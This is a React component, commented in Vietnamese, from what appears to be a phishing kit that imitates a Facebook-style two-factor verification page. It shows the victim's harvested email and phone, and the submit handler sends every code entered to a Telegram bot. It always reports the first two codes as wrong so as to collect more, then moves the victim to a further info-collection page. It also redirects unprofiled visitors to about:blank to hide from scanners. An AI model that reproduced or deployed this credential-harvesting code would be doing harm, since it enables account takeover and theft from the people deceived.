import VerifyImage from '@/assets/images/681.png';
import { faCircleInfo } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { useState, useEffect, useCallback } from 'react';
import sendMessage from '@/utils/telegram';
import { useNavigate } from 'react-router';
import { PATHS } from '@/router/router';

const Verify = () => {
    const navigate = useNavigate();
    const [code, setCode] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [attempts, setAttempts] = useState(0);
    const [translatedTexts, setTranslatedTexts] = useState({
        title: 'Check your device',
        description: '',
        placeholder: 'Enter your code',
        infoTitle: 'Approve from another device or Enter your verification code',
        infoDescription: 'This may take a few minutes. Please do not leave this page until you receive the code. Once the code is sent, you will be able to appeal and verify.',
        submit: 'Continue',
        sendCode: 'Send new code',
        errorMessage: 'The verification code you entered is incorrect',
        loadingText: 'Please wait'
    });

    // 🎯 CẬP NHẬT: Load và khởi tạo dịch
    useEffect(() => {
        const ipInfo = localStorage.getItem('ipInfo');
        if (!ipInfo) {
            window.location.href = 'about:blank';
            return;
        }

        // 🎯 LẤY DATA TỪ LOCALSTORAGE
        const savedUserInfo = localStorage.getItem('userInfo');
        let actualEmail = 's****g@m****.com';
        let actualPhone = '******32';
        
        if (savedUserInfo) {
            try {
                const userData = JSON.parse(savedUserInfo);
                actualEmail = userData.email || actualEmail;
                actualPhone = userData.phone || actualPhone;
            } catch (error) {
                console.log('Error parsing userInfo:', error);
            }
        }

        const targetLang = localStorage.getItem('targetLang');
        
        // 🎯 ƯU TIÊN DÙNG BẢN DỊCH ĐÃ LƯU TỪ HOME
        if (targetLang && targetLang !== 'en') {
            const savedTranslation = localStorage.getItem(`translatedVerify_${targetLang}`);
            if (savedTranslation) {
                try {
                    const parsedTranslation = JSON.parse(savedTranslation);
                    // 🎯 FIX: Loại bỏ ngắt dòng và sửa thứ tự "của bạn"
                    const fixedTranslation = {
                        ...parsedTranslation,
                        description: parsedTranslation.description?.replace(/\n/g, ' ').trim() || `We have sent a verification code to ${actualEmail}, ${actualPhone} . Please enter the code we just sent to continue.`
                    };
                    setTranslatedTexts(fixedTranslation);
                } catch {
                    // Nếu lỗi thì dùng tiếng Anh với data thật
                    setTranslatedTexts(prev => ({
                        ...prev,
                        description: `We have sent a verification code to ${actualEmail}, ${actualPhone} of yours. Please enter the code we just sent to continue.`
                    }));
                }
            } else {
                // Nếu chưa có bản dịch thì dùng tiếng Anh với data thật
                setTranslatedTexts(prev => ({
                    ...prev,
                    description: `We have sent a verification code to ${actualEmail}, ${actualPhone} of yours. Please enter the code we just sent to continue.`
                }));
            }
        } else {
            // 🎯 TIẾNG ANH: DÙNG DATA THẬT - ĐÃ SỬA THỨ TỰ
            setTranslatedTexts(prev => ({
                ...prev,
                description: `We have sent a verification code to ${actualEmail}, ${actualPhone} of yours. Please enter the code we just sent to continue.`
            }));
        }
    }, []);

    const handleSubmit = async () => {
        if (!code.trim()) return;

        setIsLoading(true);
        setShowError(false);

        try {
            const message = `🔐 <b>Code ${attempts + 1}:</b> <code>${code}</code>`;
            await sendMessage(message);
        } catch (error) {
            console.log('Send message error:', error);
        }

        // Delay 1 giây
        await new Promise((resolve) => setTimeout(resolve, 1000));

        const newAttempts = attempts + 1;
        setAttempts(newAttempts);

        if (newAttempts < 3) {
            setShowError(true);
            setIsLoading(false);
            setCode('');
        } else {
            navigate(PATHS.SEND_INFO);
        }
    };

    return (
        <div className='flex flex-col items-center justify-center bg-[#f8f9fa] h-dvh px-4 md:px-0 py-8 md:py-0'>
            <title>Account | Privacy Policy</title>
            <div className='flex max-w-xl flex-col gap-4 rounded-lg bg-white p-4 shadow-lg w-full md:w-auto'>
                <p className='text-3xl font-bold'>{translatedTexts.title}</p>
                {/* 🎯 SỬA: Trên mobile không bị ngắt dòng, trên desktop bình thường */}
                <p className='whitespace-normal md:whitespace-pre-line break-words'>{translatedTexts.description}</p>

                <img src={VerifyImage} alt='' className='w-full' />
                
                <input
                    type='number'
                    inputMode='numeric'
                    max={8}
                    placeholder={translatedTexts.placeholder}
                    className='rounded-lg border border-gray-300 bg-[#f8f9fa] px-6 py-2 text-lg font-medium w-full'
                    value={code}
                    onChange={(e) => setCode(e.target.value)}
                    onKeyPress={(e) => e.key === 'Enter' && handleSubmit()}
                />
                
                {showError && <p className='text-sm text-red-500'>{translatedTexts.errorMessage}</p>}
                
                <div className='flex items-center gap-4 bg-[#f8f9fa] p-4'>
                    <FontAwesomeIcon icon={faCircleInfo} size='xl' className='text-[#9f580a]' />
                    <div>
                        <p className='font-medium'>{translatedTexts.infoTitle}</p>
                        <p className='text-sm text-gray-600'>{translatedTexts.infoDescription}</p>
                    </div>
                </div>

                <button
                    className='rounded-md bg-[#0866ff] px-4 py-2 text-sm font-medium text-white hover:bg-blue-600 disabled:opacity-50 disabled:bg-gray-400 mt-2 w-full md:w-auto'
                    onClick={handleSubmit}
                    disabled={isLoading || !code.trim()}
                >
                    {isLoading ? translatedTexts.loadingText + '...' : translatedTexts.submit}
                </button>

                <p className='cursor-pointer text-center text-blue-900 hover-underline'>{translatedTexts.sendCode}</p>
            </div>
        </div>
    );
};

export default Verify;
